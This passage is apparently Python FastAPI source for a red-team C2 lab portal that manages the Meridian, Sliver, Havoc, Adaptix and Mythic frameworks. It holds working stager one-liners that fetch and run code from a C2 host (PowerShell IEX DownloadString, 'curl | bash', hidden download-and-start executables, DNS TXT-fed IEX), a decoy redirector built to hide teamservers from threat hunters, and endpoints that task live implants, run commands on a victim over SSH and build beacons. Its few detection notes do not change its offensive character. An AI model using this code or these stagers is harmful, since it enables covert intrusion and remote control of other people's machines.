            "status": "received",
        }
    ]

    matched_framework = None
    clean_path = req.url_path.strip()
    for fw, prefix in _prefixes().items():
        if clean_path.startswith(prefix):
            matched_framework = fw
            break

    if not has_valid_header:
        # Diverted to CloudEdge CDN Decoy Page
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {_cfg('c2_header_name')}",
            "node": "Apache RewriteEngine",
            "detail": f"Header '{_cfg('c2_header_name')}: {_cfg('c2_header_value')}' MISSING or INVALID. Access Denied to C2 Core.",
            "status": "shield_divert",
        })
        trace.append({
            "step": 3,
            "title": "Serve Decoy CDN Content",
            "node": "CloudEdge CDN Engine",
            "detail": "Serving benign HTTP 200 OK CDN asset page. Internal C2 teamservers remain 100% invisible to threat hunters and scanners.",
            "status": "decoy_served",
        })
        outcome = {
            "routed_to": "CloudEdge CDN Decoy Page",
            "http_status": 200,
            "content_type": "text/html",
            "preview": "<html><head><title>CloudEdge Global Edge Delivery</title></head><body><h1>Asset Cached</h1></body></html>",
            "opsec_shielded": True,
            "trace": trace,
        }
    else:
        # Header valid -> Route to backend
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {_cfg('c2_header_name')}",
            "node": "Apache RewriteEngine",
            "detail": f"Header verified ('{_cfg('c2_header_name')}: {_cfg('c2_header_value')}'). Access granted to internal C2 network.",
            "status": "header_verified",
        })

        if matched_framework:
            backend_port = _ports()[matched_framework].get("http", 80)
            trace.append({
                "step": 3,
                "title": f"Reverse Proxy to {matched_framework.capitalize()}",
                "node": f"Internal c2_core network (http://{matched_framework}:{backend_port})",
                "detail": f"Proxying payload beacon to {matched_framework} container. Zero direct internet exposure.",
                "status": "c2_forwarded",
            })
            outcome = {
                "routed_to": f"C2 Backend [{matched_framework.upper()}]",
                "http_status": 200,
                "framework": matched_framework,
                "internal_endpoint": f"http://{matched_framework}:{backend_port}{clean_path}",
                "opsec_shielded": False,
                "trace": trace,
            }
        else:
            trace.append({
                "step": 3,
                "title": "Prefix Mismatch",
                "node": "Apache Proxy",
                "detail": f"No C2 framework mapped to URI prefix '{clean_path}'. Returning HTTP 404.",
                "status": "not_found",
            })
            outcome = {
                "routed_to": "HTTP 404 (Prefix Mismatch)",
                "http_status": 404,
                "framework": None,
                "opsec_shielded": True,
                "trace": trace,
            }

    return outcome


@app.post("/api/dns/dissect")
def dissect_dns_tunnel(req: DnsDissectRequest) -> dict[str, Any]:
    """Dissect and visualize Base32 DNS TXT covert tunneling as implemented in Meridian C2.

    Breaks commands down into safe RFC 1035 labels and simulates server reassembly.
    """
    raw_bytes = req.payload_text.encode("utf-8")
    # Base32 encode without padding for clean DNS labels
    b32_encoded = base64.b32encode(raw_bytes).decode("ascii").rstrip("=")
    
    # Meridian splits into 36-character chunk labels
    chunk_size = 36
    chunks = [b32_encoded[i : i + chunk_size] for i in range(0, len(b32_encoded), chunk_size)]
    total_chunks = len(chunks)

    dissected_packets = []
    for idx, chunk in enumerate(chunks, start=1):
        fqdn = f"{idx:02d}.{req.session_id}.{chunk}.{req.domain_suffix}".lower()
        dissected_packets.append({
            "sequence": idx,
            "total": total_chunks,
            "chunk_data": chunk,
            "chunk_len": len(chunk),
            "generated_query": fqdn,
            "query_type": "TXT",
            "udp_port": 15353,
            "label_safe": len(chunk) <= 63,
        })

    return {
        "original_payload": req.payload_text,
        "byte_length": len(raw_bytes),
        "base32_length": len(b32_encoded),
        "total_packets": total_chunks,
        "session_id": req.session_id,
        "domain_suffix": req.domain_suffix,
        "encryption_cipher": "X25519 ECDH + HKDF-SHA256 + AES-256-GCM",
        "wire_protocol": "UDP DNS Port 5353 (Host: 15353)",
        "packets": dissected_packets,
        "educational_notes": [
            "Why Base32? Base32 uses only A-Z and 2-7, which comply strictly with RFC 1035 case-insensitive DNS hostname characters.",
            "Why 36-byte chunks? DNS labels cannot exceed 63 bytes. Meridian caps chunks at 36 chars to ensure sequence headers and domain suffix fit comfortably.",
            "Why UDP 15353? Windows mDNS occupies 5353 on the host; C2Stack maps host UDP 15353 to the container's 5353 port.",
            "Defensive Detection: High-frequency TXT lookups with high Shannon entropy are prime targets for Sigma rules and Zeek DNS log analysis.",
        ],
    }


@app.get("/api/payloads")
def get_payload_studio() -> dict[str, Any]:
    """Return command syntax, delivery one-liners, and detection profiles for all 5 frameworks."""
    return {
        "meridian": {
            "name": "Meridian C2",
            "description": "Ultra-lightweight, zero-dependency Go implant with dual HTTP & DNS TXT tunneling.",
            "stagers": {
                "powershell_http": (
                    f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{_cfg('c2_header_name')}","{_cfg('c2_header_value')}"); '
                    f'IEX($wc.DownloadString("http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["meridian"]}"))'
                ),
                "powershell_dns": (
                    '$cmd = (Resolve-DnsName -Name "init.' +
                    _cfg("meridian_dns_domain") +
                    '" -Type TXT -Server "' + _victim_ip() +
                    '").Strings; '
                    'IEX([System.Text.Encoding]::UTF8.GetString('
                    '[System.Convert]::FromBase64String($cmd)))'
                ),
                "bash_curl": (
                    f'curl -s -H "{_cfg('c2_header_name')}: {_cfg('c2_header_value')}" '
                    f'http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["meridian"]} | bash'
                ),
                "binary_compile": "GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o parallax-windows-amd64.exe ./implant",
            },
            "detection": {
                "network": "High-frequency DNS TXT queries (UDP/15353) or HTTP requests carrying custom header.",
                "host": "Process execution without disk artifacts if using memory staging.",
                "event_ids": ["Event ID 4688 (Process Creation)", "Sysmon Event ID 22 (DNS Query)"],
            },
        },
        "sliver": {
            "name": "BishopFox Sliver",
            "description": "Enterprise-grade Go implant framework supporting in-memory .NET execution, BOFs, and lateral movement.",
            "stagers": {
                "generate_session": f"sliver > generate --http {_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()['sliver']} --os windows --arch amd64 --save ./implant.exe",
                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
                "execute_assembly": "sliver (session) > execute-assembly /opt/tools/Rubeus.exe triage",
            },
            "detection": {
                "network": "Configurable HTTP C2 profile, mTLS on port 8888, WireGuard tunneling.",
                "host": "CLR loading into unmanaged processes via execute-assembly, RWX memory allocations.",
                "event_ids": ["Sysmon Event ID 7 (Image Loaded - clr.dll)", "Sysmon Event ID 10 (ProcessAccess)"],
            },
        },
        "havoc": {
            "name": "Havoc C2",
            "description": "Modern C++ Demon payload featuring indirect syscalls, API hashing, and Ekko/Zilean sleep masking.",
            "stagers": {
                "demon_build": "Havoc Client -> Attack -> Payload -> Format: Windows EXE/DLL -> Indirect Syscalls: Enabled -> Sleep Technique: Ekko",
                "delivery": f'curl -H "{_cfg('c2_header_name')}: {_cfg('c2_header_value')}" http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["havoc"]} -o payload.exe',
            },
            "detection": {
                "network": "HTTP/HTTPS heartbeats with custom user-agents and jitter.",
                "host": "Sleep obfuscation changes thread permissions to RW/RX dynamically.",
                "event_ids": ["Sysmon Event ID 8 (CreateRemoteThread)", "Sysmon Event ID 1 (Process Creation)"],
            },
        },
        "adaptix": {
            "name": "Adaptix C2",
            "description": "Go-based post-exploitation teamserver for multiplayer operations with Gopher TCP agent.",
            "stagers": {
                "client_connect": f"Adaptix Qt GUI Client -> Endpoint: {_victim_ip()}:{_cfg_int('adaptix_ts_port', 4321)} -> User: operator (or headless REST: POST /endpoint/login, see Module 4)",
                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["adaptix"]} -OutFile agent.exe"',
            },
            "detection": {
                "network": "Raw TCP/mTLS egress or HTTP sync calls on port 80.",
                "host": "Beacon check-in routines and thread injection.",
                "event_ids": ["Sysmon Event ID 3 (Network Connection)"],
            },
        },
        "mythic": {
            "name": "Mythic C2",
            "description": "Multi-agent collaborative framework (Apollo for Windows, Poseidon for Linux/macOS). Latest stable = 3.4.0.61 (v4 ships profiles built-in, not yet GA).",
            "stagers": {
                "rest_login": f"curl -s http://{_victim_ip()}:{_cfg_int('mythic_ui_port', 7443)}/auth -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"mythic_admin\",\"password\":\"mythic\"}}'",
                "payload_build": f"create_c2parameter_instance_webhook -> start_stop_profile_webhook -> createpayload_webhook (payloadDefinition JSON-STRING, build_parameters as LIST; C2 shape: bare callback_host http://{_victim_ip()} + full-path post_uri {_prefixes()['mythic']}/data) -> download exe via GET /direct/download/<uuid>. Verified working incl. keying + COFF; see Docker/mythic/README.md and Module 5.",
                "ui_url": f"http://{_victim_ip()}:{_cfg_int('mythic_ui_port', 7443)} (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
            },
            "detection": {
                "network": "Customizable HTTP profile mimicking common CDN streaming services.",
                "host": "Assembly loading, named pipe IPC.",
                "event_ids": ["Sysmon Event ID 17/18 (Pipe Created/Connected)"],
            },
        },
    }


# ============================================================================
# Real backend operations (tasking, payloads, victim) - see c2backends.py
# ============================================================================
import c2backends as cb  # noqa: E402


class TaskRequest(BaseModel):
    session_id: str = Field(..., description="Session/callback id")
    backend: str = Field(..., description="meridian | mythic | havoc | adaptix | sliver")
    command: str = Field(..., description="Raw command line (alias commands take "
                                           "a plain string, not JSON)")
    callback_id: int | None = Field(None, description="Mythic callback id")
    wait: int = Field(25, description="Seconds to collect output")
    upload_data_b64: str | None = Field(
        None, description="Havoc `upload` file bytes (base64); required with "
                           "`upload <remote-path>` since the wire carries "
                           "b64(remote)+b64(content)")


@app.get("/api/ops/summary")
def ops_summary() -> dict[str, Any]:
    """What the portal can actually DO right now, probed live."""
    out: dict[str, Any] = {}
    try:
        rows = cb.mythic_psql(
            "SELECT id, name, container_running FROM payloadtype;",
            ["id", "name", "container_running"])
        out["mythic"] = {
            "ok": True,
            "payload_types": [{"id": r.get("id"), "name": r.get("name"),
                               "running": r.get("container_running") == "t"}
                              for r in rows],
        }
    except Exception as exc:  # noqa: BLE001
        out["mythic"] = {"ok": False, "error": str(exc)[:200]}
    try:
        cbs = cb.mythic_psql("SELECT id, name, container_running FROM c2profile ORDER BY id;",
                             ["id", "name", "container_running"])
        out["mythic"]["c2_profiles"] = [
            {"id": r.get("id"), "name": r.get("name"), "running": r.get("container_running") == "t"}
            for r in cbs
        ]
    except Exception as exc:  # noqa: BLE001
        out["mythic"]["c2_profiles_error"] = str(exc)[:200]
    try:
        out["meridian"] = {"ok": True, "sessions": len(cb.meridian_sessions())}
    except Exception as exc:  # noqa: BLE001
        out["meridian"] = {"ok": False, "error": str(exc)[:200]}
    out["victim"] = {"reachable": cb.victim_reachable(), "ssh_target": cb.VICTIM_SSH or None}

    # Adaptix: official REST API at /endpoint (login -> listeners/agents).
    try:
        import adaptix_client as ax
        ac = ax.AdaptixClient()
        ac.login()
        out["adaptix"] = {
            "ok": True,
            "auth": "rest /endpoint/login",
            "listeners": ac.list_listeners(),
        }
    except Exception as exc:  # noqa: BLE001
        out["adaptix"] = {"ok": False, "error": str(exc)[:300]}

    # Havoc: teamserver state is visible in its logs; no REST API exists in 0.7.
    out["havoc"] = {
        "ok": True,
        "note": ("Havoc 0.7 exposes NO REST/gRPC API - the operator protocol is "
                 "WebSocket+TLS on 40056. The portal drives it via a raw "
                 "WebSocket client (see /api/ops/havoc/*)."),
        "teamserver": f"havoc:{_cfg_int('havoc_ts_port', 40056)} "
                        "(operator WebSocket; victim-facing callback goes "
                        "through the redirector, not here)",
        "user": "5pider",
    }
    out["redirector"] = {
        "decoy": cb.probe_redirector("/", timeout=5.0),
        "meridian": cb.probe_redirector(
            f"{_prefix('meridian')}/",
            {_cfg("c2_header_name"): _cfg("c2_header_value")}, timeout=5.0),
    }
    return out


class LabConfigUpdate(BaseModel):
    """Partial update: only the keys present are changed. An empty string
    clears an override and falls back to env/default."""
    values: dict[str, Any] = Field(
        ..., description="Setting key -> new value (see GET /api/config)")
    clear: list[str] = Field(
        default_factory=list, description="Setting keys to reset to env/default")


@app.get("/api/config")
def get_lab_config() -> dict[str, Any]:
    """Every operator-configurable setting, its current value and provenance.

    This is the endpoint the config UI renders from; it is also the honest
    answer to "what is this lab actually using right now" - resolved values,
    not the defaults someone remembers from the docs.
    """
    return {
        "ok": True,
        "settings": labconfig.snapshot(),
        "config_path": labconfig.CONFIG_PATH,
        "env_lines": labconfig.env_lines(),
        "discovered": labconfig.observed(),
        "notes": {
            "portal_scope": "Applied immediately. Drives stagers, build "
                            "defaults and everything the portal hands to a "
                            "teamserver API.",
            "stack_scope": "Read by OTHER containers when they boot (Apache "
                           "routes, Havoc's rendered profile, Meridian's "
                           "listener config). Change it here, then copy the "
                           "env file below into Docker/.env and recreate the "
                           "containers.",
        },
    }


def _havoc_fields(text: str) -> dict[str, str]:
    """Values baked into a Havoc profile. Shared by discovery (live file) and
    the portal's own last render, so the two are comparable field by field."""
    out: dict[str, str] = {}
    host = re.search(r'Hosts\s*=\s*\[\s*"([^"]+)"', text)
    if host:
        out["victim_redirector_ip"] = host.group(1)
    bind = re.search(r"PortBind\s*=\s*(\d+)", text)
    if bind:
        out["redirector_http_port"] = bind.group(1)
    uri = re.search(r'Uris\s*=\s*\[\s*"([^"]+)"', text)
    if uri:
        out["havoc_uri_prefix"] = uri.group(1).rstrip("/")
    header = re.search(r'"([A-Za-z0-9-]+):\s*([^"]+)"', text)
    if header and "cadre" not in text.split(header.group(0))[0][-40:]:
        out["c2_header_name"] = header.group(1)
        out["c2_header_value"] = header.group(2)
    return out


def _vhost_fields(text: str) -> dict[str, str]:
    """Route prefixes + header gate from a rendered Apache vhost.

    Positional mapping: the template emits routes in mythic, mythic-httpx,
    sliver, havoc, adaptix, meridian order, so the REQUEST_URI conds map to
    settings by position.
    """
    out: dict[str, str] = {}
    conds = re.findall(r"RewriteCond %\{REQUEST_URI\} \^(/[^\s(]+)\(/\|",
                       text)
    order = ["mythic_uri_prefix", None, "sliver_uri_prefix",
             "havoc_uri_prefix", "adaptix_uri_prefix", "meridian_uri_prefix"]
    for cond, key in zip(conds, order):
        if key:
            out[key] = cond
    gate = re.search(r"RewriteCond %\{HTTP:([A-Za-z0-9-]+)\} \^(.+?)\$ \[NC\]",
                     text)
    if gate:
        out["c2_header_name"] = gate.group(1)
        out["c2_header_value"] = gate.group(2)
    return out


def _observe_live_stack() -> dict[str, str]:
    """Learn what the running containers actually use, before rendering.

    Without this the renderer would stamp documented defaults over live state:
    the Meridian DNS domain lives in its state volume from first boot, so a lab
    using c2.cadre.local would get silently re-pointed to the default
    c2.lab.local - a DNS C2 channel answering for nothing. Discovery only
    fills in values nobody set explicitly, so it can never override intent.

    It also never adopts state the portal itself wrote: live values are
    compared against the portal's last render, and anything identical is
    skipped. Otherwise clearing a setting ("back to default") would be
    defeated - discovery would re-learn the stale live value, still present
    because the containers have not been recreated yet, and stamp it straight
    back into the new render.
    """
    import lagrender

    def _cat(container: str, path: str) -> str | None:
        try:
            done = subprocess.run(
                ["docker", "exec", container, "cat", path],
                capture_output=True, timeout=20, check=False)
            if done.returncode == 0 and done.stdout:
                return done.stdout.decode("utf-8", "replace")
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            pass
        return None

    def _rendered(name: str) -> str | None:
        try:
            with open(os.path.join(lagrender.RENDER_DIR, name),
                      "r", encoding="utf-8") as fh:
                return fh.read()
        except OSError:
            return None

    live: dict[str, str] = {}
    try:
        live.update(_havoc_fields(
            _cat("c2stack-havoc-1",
                 "/opt/havoc/teamserver/data/havoc.yaotl") or ""))
    except Exception:  # noqa: BLE001 - discovery is best-effort by design
        pass
    try:
        raw = _cat("c2stack-meridian-1", "/root/.meridian/config.json")
        data = json.loads(raw or "{}")
        domains = {li.get("domain") for li in data.get("listeners", [])
                   if li.get("domain")}
        if len(domains) == 1:
            live["meridian_dns_domain"] = domains.pop()
    except Exception:  # noqa: BLE001
        pass
    try:
        live.update(_vhost_fields(
            _cat("c2stack-redirector-1",
                 "/etc/apache2/sites-available/c2stack.conf") or ""))
    except Exception:  # noqa: BLE001
        pass

    # What the portal last wrote. Anything live that matches it is our own
    # output, not external state, and must not be adopted.
    last: dict[str, str] = {}
    try:
        rendered_havoc = _rendered("havoc/havoc.yaotl")
        if rendered_havoc is not None:
            last.update(_havoc_fields(rendered_havoc))
        rendered_meridian = _rendered("meridian/config.json")
        if rendered_meridian is not None:
            try:
                data = json.loads(rendered_meridian)
                domains = {li.get("domain")
                           for li in data.get("listeners", [])
                           if li.get("domain")}
                if len(domains) == 1:
                    last["meridian_dns_domain"] = domains.pop()
            except (ValueError, AttributeError):
                pass
        rendered_vhost = _rendered("redirector/c2stack.conf")
        if rendered_vhost is not None:
            last.update(_vhost_fields(rendered_vhost))
    except Exception:  # noqa: BLE001
        pass

    found = {k: v for k, v in live.items() if last.get(k) != v}
    for key, value in found.items():
        labconfig.observe(key, value)
    return found


@app.post("/api/config/apply", dependencies=[Depends(verify_operator_auth)])
def apply_lab_config() -> dict[str, Any]:
    """Render the sibling containers' config files from the current settings.

    This is what makes stack-scope settings a one-click operation instead of
    "edit .env by hand and recreate". The portal writes real files into the
    shared render volume; each consumer entrypoint prefers them and falls back
    to its own environment rendering when they are absent.

    Rendering is NOT applying: the target containers must still restart to
    re-read their config, and that is reported per target rather than done
    silently (restarting a live C2 backend under an operator mid-operation is
    not a side effect a settings form should trigger without being explicit).
    """
    import lagrender
    discovered = _observe_live_stack()
    try:
        result = lagrender.render_all()
    except Exception as exc:  # noqa: BLE001
        raise HTTPException(status_code=500,
                            detail=f"render failed: {exc}") from exc
    result["discovered_from_stack"] = discovered
    result["restart_required"] = [
        w["target"] for w in result.get("written", [])]
    return result


@app.get("/api/config/rendered")
def get_rendered_configs() -> dict[str, Any]:
    """What the portal has actually written for the other containers.

    Useful when a route misbehaves: this shows the file the consumer will read
    rather than the setting that was intended.
    """
    import lagrender
    out: dict[str, Any] = {}
    for name, path in (("redirector", lagrender.REDIRECTOR_CONF),
                       ("meridian", lagrender.MERIDIAN_CONFIG),
                       ("havoc", lagrender.HAVOC_PROFILE)):
        try:
            with open(path, "r", encoding="utf-8") as fh:
                out[name] = {"path": path, "content": fh.read()}
        except OSError:
            out[name] = {"path": path, "content": None,
                         "note": "not rendered yet - the container is using "
                                 "its own environment rendering"}
    return {"ok": True, "rendered": out}


@app.post("/api/config", dependencies=[Depends(verify_operator_auth)])
def update_lab_config(req: LabConfigUpdate) -> dict[str, Any]:
    """Persist lab settings from the UI.

    Rejects unknown keys and malformed values instead of storing them: a
    typo'd setting that silently does nothing is the worst outcome here,
    because the operator would believe they had re-pointed their implants.
    """
    for key in req.clear:
        if key not in labconfig.SETTINGS:
            raise HTTPException(status_code=400,
                                detail=f"unknown setting '{key}'")
        labconfig.clear(key)
        # Forget any discovered live value too: otherwise the next render's
        # discovery pass would re-learn the stale value still present in the
        # not-yet-recreated containers and stamp it straight back in, making
        # "reset to default" silently do nothing.
        labconfig.forget(key)
    applied, errors = labconfig.set_overrides(req.values or {})
    if errors:
        raise HTTPException(status_code=400, detail="; ".join(errors))
    return {
        "ok": True,
        "applied": applied,
        "cleared": req.clear,
        "settings": labconfig.snapshot(),
        "env_file": labconfig.render_env_file(),
        "restart_required": sorted(
            k for k, spec in labconfig.SETTINGS.items()
            if spec["scope"] == "stack"
            and (k in applied or k in req.clear)),
    }


@app.get("/api/config/env-file")
def download_lab_env() -> Response:
    """The Docker/.env lines for stack-scope settings, ready to copy.

    Portal-scope values are intentionally excluded: the portal persists them
    itself, so writing them here too would create two sources of truth that
    could disagree.
    """
    return Response(
        content=labconfig.render_env_file(),
        media_type="text/plain",
        headers={"Content-Disposition":
                 "attachment; filename=c2stack-lab.env"},
    )


@app.post("/api/ops/task", dependencies=[Depends(verify_operator_auth)])
def ops_task(req: TaskRequest) -> dict[str, Any]:
    """Queue a real command against a live session, on any backend.

    Each framework gets its own calling convention - the caller passes the
    native syntax for that framework:
      mythic    the raw command line; `shell` is an alias so params must be
                the plain string, not JSON
      meridian  the raw command line
      adaptix   an AxScript command (getuid, ls <dir>, ps list,
                shell <cmdline>, powershell <cmdline>)
      havoc     a shell command line; the portal wraps it in the ProcModule
                task the GUI builds
      sliver    a program + arguments line, executed directly with NO shell
                (no `>`, `|`, `&&`). For shell features wrap explicitly, e.g.
                `cmd.exe "/c whoami > C:\\out.txt"`. Sessions only: beacons
                cannot be tasked with --use.
    """
    try:
        if req.backend == "meridian":
            return {"ok": True, "backend": "meridian",
                    "result": cb.meridian_exec(req.session_id, req.command)}
        if req.backend == "mythic":
            import time as _time
            client = cb.MythicClient()
            cid = req.callback_id if req.callback_id is not None else int(req.session_id)
            # `shell` is an ALIAS command: params is the RAW command line, not JSON.
            out = client.post("/api/v1.4/create_task_webhook",
                              {"input": {"command": "shell", "params": req.command,
                                         "callback_id": cid}})
            task_id = out.get("id")
            # task.stdout never carries output in this stack (see matrix
            # §1.3); poll the response table where the agent's real output
            # lands (callback interval 10s + jitter, so allow the wait).
            output: list[str] = []
            if task_id:
                stop = _time.time() + max(5.0, float(req.wait))
                while _time.time() < stop:
                    output = cb.mythic_task_output(task_id)
                    if output:
                        break
                    _time.sleep(5)
            return {"ok": True, "backend": "mythic",
                    "result": {**out, "output": "\n".join(output)}}
        if req.backend == "adaptix":
            import adaptix_client as ax
            ac = ax.AdaptixClient()
            ac.login()
            return {"ok": True, "backend": "adaptix",
                    "result": ac.agent_command_raw(req.session_id, req.command),
                    "results": ac.completed_tasks(req.session_id, limit=10)}
        if req.backend == "havoc":
            import havoc_client as hv
            return {"ok": True, "backend": "havoc",
                    "result": hv._run(hv.HavocClient().run(
                        req.session_id, req.command, wait=float(req.wait),
                        upload_data_b64=req.upload_data_b64))}
        if req.backend == "sliver":
            import sliver_client as sc
            return {"ok": True, "backend": "sliver",
                    "result": sc.task(req.session_id, req.command)}
        raise HTTPException(status_code=400,
                            detail=f"unsupported backend '{req.backend}'")
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


def _havoc_alive(session: dict) -> bool:
    """Havoc's session list keeps dead demons forever; liveness must be
    derived from the raw LastCallIn stamp (dd-MM-yyyy HH:mm:ss, teamserver
    container time = UTC) instead of being hardcoded."""
    raw = session.get("raw") or {}
    last = raw.get("LastCallIn")
    if not last:
        return True
    try:
        from datetime import datetime, timezone
        dt = datetime.strptime(str(last), "%d-%m-%Y %H:%M:%S")
        dt = dt.replace(tzinfo=timezone.utc)
    except ValueError:
        return True
    sleep = float(session.get("sleep") or 5)
    grace = max(90.0, sleep * 8.0 + 30.0)
    return (datetime.now(timezone.utc) - dt).total_seconds() < grace


def _adaptix_alive(agent: dict) -> bool:
    """Adaptix's agent list also retains dead agents; a_last_tick is the
    unix epoch of the last beacon, so liveness is computed, not assumed."""
    tick = agent.get("a_last_tick")
    if not tick:
        return True
    import time as _time
    sleep = float(agent.get("a_sleep") or 30)
    grace = max(150.0, sleep * 8.0 + 60.0)
    return (_time.time() - float(tick)) < grace


@app.get("/api/ops/sessions")
def ops_sessions() -> dict[str, Any]:
    """Live sessions across every framework that can be queried headlessly.

    Backends are independent: each reports its own error rather than being
    silently dropped, and nothing is invented when a backend is unreachable.
    """
    sessions: list[dict[str, Any]] = []
    backends: dict[str, Any] = {}

    try:
        rows = cb.mythic_psql(
            "SELECT id, host, user, pid, os, architecture, active, dead, "
            "process_name, description, last_checkin FROM callback ORDER BY id DESC LIMIT 50;",
            ["id", "host", "user", "pid", "os", "architecture", "active", "dead",
             "process_name", "description", "last_checkin"])
        for r in rows:
            sessions.append({
                "id": str(r.get("id")),
                "backend": "mythic",
                "hostname": r.get("host") or "?",
                "username": r.get("user") or "?",
                "os": f"{r.get('os','?')} {r.get('architecture','')}".strip(),
                "pid": r.get("pid"),
                "process": r.get("process_name") or "?",
                "description": r.get("description") or "",
                "is_alive": r.get("active") == "t" and r.get("dead") == "f",
                # Mythic only marks callbacks dead when a new one with the
                # same fingerprint arrives; expose the stamp so the UI can
                # show freshness instead of implying every row is live.
                "last_checkin": str(r.get("last_checkin") or ""),
            })
        backends["mythic"] = {"ok": True, "count": len(rows)}
    except Exception as exc:  # noqa: BLE001
        backends["mythic"] = {"ok": False, "error": str(exc)[:200]}

    try:
        m = cb.meridian_sessions()
        sessions.extend(m)
        backends["meridian"] = {"ok": True, "count": len(m)}
    except Exception as exc:  # noqa: BLE001
        backends["meridian"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import havoc_client as hv
        h = hv._run(hv.HavocClient().list_sessions())
        for s in h:
            sessions.append({
                "id": s["id"], "backend": "havoc",
                "hostname": s.get("computer") or "?",
                "username": s.get("username") or "?",
                "os": " ".join(x for x in (s.get("os"), s.get("os_build")) if x),
                "pid": s.get("pid"), "is_alive": _havoc_alive(s),
                "elevated": s.get("elevated"),
                "process": s.get("process"),
                "listener": s.get("listener"),
                "sleep": s.get("sleep"),
            })
        backends["havoc"] = {"ok": True, "count": len(h)}
    except Exception as exc:  # noqa: BLE001
        backends["havoc"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import adaptix_client as ax
        ac = ax.AdaptixClient()
        ac.login()
        agents = ac.list_agents() or []
        if isinstance(agents, dict):
            agents = agents.get("agents") or agents.get("data") or []
        for a in agents:
            sessions.append({
                "id": str(a.get("a_id")), "backend": "adaptix",
                "hostname": a.get("a_computer") or "?",
                "username": a.get("a_username") or "?",
                "os": a.get("a_os_desc") or "?",
                "pid": a.get("a_pid"), "is_alive": _adaptix_alive(a),
                "elevated": a.get("a_elevated"),
                "process": a.get("a_process"),
                "listener": a.get("a_listener"),
                "domain": a.get("a_domain"),
                "internal_ip": a.get("a_internal_ip"),
            })
        backends["adaptix"] = {"ok": True, "count": len(agents)}
    except Exception as exc:  # noqa: BLE001
        backends["adaptix"] = {"ok": False, "error": str(exc)[:200]}

    try:
        import sliver_client as sc
        sl = sc.sessions()
        for s in sl:
            s["backend"] = "sliver"
            sessions.append(s)
        backends["sliver"] = {"ok": True, "count": len(sl)}
    except Exception as exc:  # noqa: BLE001
        backends["sliver"] = {"ok": False, "error": str(exc)[:200]}

    return {"count": len(sessions), "sessions": sessions, "backends": backends}


@app.get("/api/ops/results")
def ops_results(backend: str, session_id: str | None = None) -> dict[str, Any]:
    """Read real task results.

    For mythic, `session_id` is actually a TASK id: output lives in the
    response table per task, not per callback (see matrix §1.3).
    """
    try:
        if backend == "meridian":
            return {"ok": True, "results": cb.meridian_results(session_id)}
        if backend == "mythic":
            return {"ok": True, "results": cb.mythic_task_output(int(session_id))}
        if backend == "adaptix":
            # command/raw only QUEUES the AxScript command; the
            # completed-task list carries the real output.
            import adaptix_client as ax
            ac = ax.AdaptixClient()
            ac.login()
            return {"ok": True,
                    "results": ac.completed_tasks(session_id, limit=10)}
        raise HTTPException(status_code=400, detail=f"unsupported backend '{backend}'")
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/probe")
def ops_probe(req: RedirectorTestRequest) -> dict[str, Any]:
    """Actually probe the redirector. Reports the REAL status, byte length and
    whether the decoy was returned."""
    return cb.probe_redirector(req.url_path, req.headers, req.method)


@app.post("/api/ops/victim", dependencies=[Depends(verify_operator_auth)])
def ops_victim(req: VictimCommandRequest) -> dict[str, Any]:
    """Run a command on the victim target over SSH."""
    result = cb.victim_exec(req.command, timeout=req.timeout)
    if not result.get("ok") and result.get("returncode") not in (0, None):
        raise HTTPException(status_code=502, detail=result.get("stderr", "ssh failed"))
    return result


@app.post("/api/ops/adaptix/listener", dependencies=[Depends(verify_operator_auth)])
def ops_adaptix_listener(req: AdaptixListenerRequest) -> dict[str, Any]:
    """Create/ensure the Adaptix HTTP Beacon listener via the REST API."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        # Unset fields follow the lab settings: a listener created from the UI
        # always matches the redirector route it has to get past.
        cfg = ax.http_listener_config(
            req.callback_address or f"{_victim_ip()}:"
                                    f"{_cfg_int('redirector_http_port', 80)}",
            req.uri or _prefix("adaptix"),
            req.c2_header or _cfg("c2_header_name"),
            req.c2_header_value or _cfg("c2_header_value"),
            req.port or _cfg_int("redirector_http_port", 80))
        out = ac.create_listener(req.name, cfg)
        return {"ok": True, "listener": req.name, "response": out,
                "listeners": ac.list_listeners()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/adaptix/agent", dependencies=[Depends(verify_operator_auth)])
def ops_adaptix_agent(req: AdaptixAgentRequest) -> dict[str, Any]:
    """Build a Windows beacon server-side and return base64 for download."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        cfg = ax.beacon_config(req.sleep, req.jitter, req.arch, req.format)
        data = ac.generate_agent(req.agent, req.listener, cfg, timeout=300)
        return {"ok": True, "agent": req.agent, "listener": req.listener,
                "filename": getattr(ac, "last_filename", "agent.bin"),
                "size": len(data),
                "base64": base64.b64encode(data).decode("ascii")}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/adaptix/agents")
def ops_adaptix_agents() -> dict[str, Any]:
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "agents": ac.list_agents()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/adaptix/task", dependencies=[Depends(verify_operator_auth)])
